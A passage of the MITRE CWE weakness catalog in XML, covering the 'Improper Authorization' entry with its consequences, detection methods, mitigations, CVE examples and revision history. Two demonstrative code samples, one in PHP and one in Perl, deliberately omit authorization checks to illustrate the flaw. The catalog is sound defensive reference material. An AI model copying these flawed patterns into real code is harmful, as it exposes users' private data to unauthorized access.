            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-09-09">Access Control Issues</Previous_Entry_Name>
            <Previous_Entry_Name Date="2011-03-29">Access Control (Authorization) Issues</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="285" Name="Improper Authorization" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action.</Description>
         <Extended_Description>
            <xhtml:p>Assuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.</xhtml:p>
            <xhtml:p>When access control checks are not applied consistently - or not at all - users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1000" Ordinal="Primary"/>
			<Related_Weakness Nature="ChildOf" CWE_ID="284" View_ID="1340" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Name="Web Server" Prevalence="Often"/>
            <Technology Name="Database Server" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: "No access", "Read access", "Change access", and "Full control". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object.</Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Description>"AuthZ" is typically used as an abbreviation of "authorization" within the web application security community. It is distinct from "AuthN" (or, sometimes, "AuthC") which is an abbreviation of "authentication." The use of "Auth" as an abbreviation is discouraged, since it could be used for either authentication or authorization.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>
                  <xhtml:p>Authorization weaknesses may arise when a single-user application is ported to a multi-user environment.</xhtml:p>
               </Note>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read sensitive data, either by reading the data directly from a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to read the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Impact>Modify Files or Directories</Impact>
               <Note>An attacker could modify sensitive data, either by writing the data directly to a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to write the data.</Note>
            </Consequence>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker could gain privileges by modifying or reading critical data directly, or by accessing insufficiently-protected, privileged functionality.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.</xhtml:p>
                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Dynamic Analysis</Method>
               <Description>Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</xhtml:p>
                  <xhtml:p>Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.</xhtml:p>
               </Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Host Application Interface Scanner</xhtml:li>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Divide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) to enforce the roles at the appropriate boundaries.</xhtml:p>
                  <xhtml:p>Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Ensure that you perform access control checks related to your business logic. These checks may be different than the access control checks that you apply to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.</xhtml:p>
                  <xhtml:p>One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>System Configuration</Phase>
               <Phase>Installation</Phase>
               <Description>Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a "default deny" policy when defining these ACLs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-95">
               <Intro_Text>This function runs an arbitrary SQL query on a given database, returning the result of the query.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function runEmployeeQuery($dbName, $name){<xhtml:div style="margin-left:1em;">mysql_select_db($dbName,$globalDbHandle) or die("Could not open Database".$dbName);<xhtml:br/>
                        <xhtml:i>//Use a prepared statement to avoid CWE-89</xhtml:i>
                        <xhtml:br/>$preparedStatement = $globalDbHandle-&gt;prepare('SELECT * FROM employees WHERE name = :name');<xhtml:br/>$preparedStatement-&gt;execute(array(':name' =&gt; $name));<xhtml:br/>return $preparedStatement-&gt;fetchAll();</xhtml:div>}<xhtml:br/>
                     <xhtml:i>/.../</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);</xhtml:div>
               </Example_Code>
               <Body_Text>While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-96">
               <Intro_Text>The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>sub DisplayPrivateMessage {<xhtml:div style="margin-left:1em;">my($id) = @_;<xhtml:br/>my $Message = LookupMessageObject($id);<xhtml:br/>print "From: " . encodeHTML($Message-&gt;{from}) . "&lt;br&gt;\n";<xhtml:br/>print "Subject: " . encodeHTML($Message-&gt;{subject}) . "\n";<xhtml:br/>print "&lt;hr&gt;\n";<xhtml:br/>print "Body: " . encodeHTML($Message-&gt;{body}) . "\n";</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $q = new CGI;<xhtml:br/>
                     <xhtml:i># For purposes of this example, assume that CWE-309 and</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i># CWE-523 do not apply.</xhtml:i>
                     <xhtml:br/>if (! AuthenticateUser($q-&gt;param('username'), $q-&gt;param('password'))) {<xhtml:div style="margin-left:1em;">ExitError("invalid username or password");</xhtml:div>}<xhtml:br/>
                     <xhtml:br/>my $id = $q-&gt;param('id');<xhtml:br/>DisplayPrivateMessage($id);</xhtml:div>
               </Example_Code>
               <Body_Text>While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users.</Body_Text>
               <Body_Text>One way to avoid this problem would be to ensure that the "to" field in the message object matches the username of the authenticated user.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-24730</Reference>
               <Description>Go-based continuous deployment product does not check that a user has certain privileges to update or create an app, allowing adversaries to read sensitive repository information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-24730</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3168</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3168</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2960</Reference>
               <Description>Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2960</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3597</Reference>
               <Description>Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3597</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2282</Reference>
               <Description>Terminal server does not check authorization for guest access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2282</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3230</Reference>
               <Description>Database server does not use appropriate privileges for certain sensitive operations.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3230</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2213</Reference>
               <Description>Gateway uses default "Allow" configuration for its authorization settings.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2213</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0034</Reference>
               <Description>Chain: product does not properly interpret a configuration option for a system group, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0034</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6123</Reference>
               <Description>Chain: SNMP product does not properly parse a configuration option for which hosts are allowed to connect, allowing unauthorized IP addresses to connect.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6123</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5027</Reference>
               <Description>System monitoring software allows users to bypass authorization by creating custom forms.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5027</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-7109</Reference>
               <Description>Chain: reliance on client-side security (CWE-602) allows attackers to bypass authorization using a custom client.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-7109</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3424</Reference>
               <Description>Chain: product does not properly handle wildcards in an authorization policy list, allowing unintended access.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3424</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-3781</Reference>
               <Description>Content management system does not check access permissions for private files, allowing others to view those files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-3781</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4577</Reference>
               <Description>ACL-based protection mechanism treats negative access rights as if they are positive, allowing bypass of intended restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4577</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6548</Reference>
               <Description>Product does not check the ACL of a page accessed using an "include" directive, allowing attackers to read unauthorized files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6548</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2925</Reference>
               <Description>Default ACL list for a DNS server does not set certain ACLs, allowing unauthorized DNS queries.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2925</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6679</Reference>
               <Description>Product relies on the X-Forwarded-For HTTP header for authorization, allowing unintended access by spoofing the header.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6679</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3623</Reference>
               <Description>OS kernel does not check for a certain privilege before setting ACLs for files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3623</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2801</Reference>
               <Description>Chain: file-system code performs an incorrect comparison (CWE-697), preventing default ACLs from being properly applied.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2801</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1155</Reference>
               <Description>Chain: product does not properly check the result of a reverse DNS lookup because of operator precedence (CWE-783), allowing bypass of DNS-based access restrictions.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1155</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Missing Access Control</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A10</Entry_ID>
               <Entry_Name>Failure to Restrict URL Access</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP35</Entry_ID>
               <Entry_Name>Insecure resource access</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
            <Related_Attack_Pattern CAPEC_ID="104"/>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="17"/>
            <Related_Attack_Pattern CAPEC_ID="39"/>
            <Related_Attack_Pattern CAPEC_ID="402"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="5"/>
            <Related_Attack_Pattern CAPEC_ID="51"/>
            <Related_Attack_Pattern CAPEC_ID="59"/>
            <Related_Attack_Pattern CAPEC_ID="60"/>
            <Related_Attack_Pattern CAPEC_ID="647"/>
            <Related_Attack_Pattern CAPEC_ID="668"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
            <Related_Attack_Pattern CAPEC_ID="87"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-229"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 4, &#34;Authorization&#34; Page 114; Chapter 6, &#34;Determining&#xA;                  Appropriate Access Control&#34; Page 171"/>
            <Reference External_Reference_ID="REF-231"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-233"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Common Vulnerabilities of Authorization&#34;, Page 39"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 11, &#34;ACL Inheritance&#34;, Page 649"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-285 is high-level and lower-level CWEs can frequently be used instead. It is a level-1 Class (i.e., a child of a Pillar).</Rationale>
            <Comments>Look at CWE-285's children and consider mapping to CWEs such as CWE-862: Missing Authorization, CWE-863: Incorrect Authorization, CWE-732: Incorrect Permission Assignment for Critical Resource, or others.</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
			<Suggestions>
			  <Suggestion CWE_ID="862" Comment="Missing Authorization"/>
			  <Suggestion CWE_ID="863" Comment="Incorrect Authorization"/>
			  <Suggestion CWE_ID="732" Comment="Incorrect Permission Assignment for Critical Resource"/>
			</Suggestions>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Likelihood_of_Exploit, Name, Other_Notes, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Type</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Detection_Factors, Modes_of_Introduction, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-24</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Changed name and description; clarified difference between "access control" and "authorization."</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Background_Details, Demonstrative_Examples, Description, Name, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
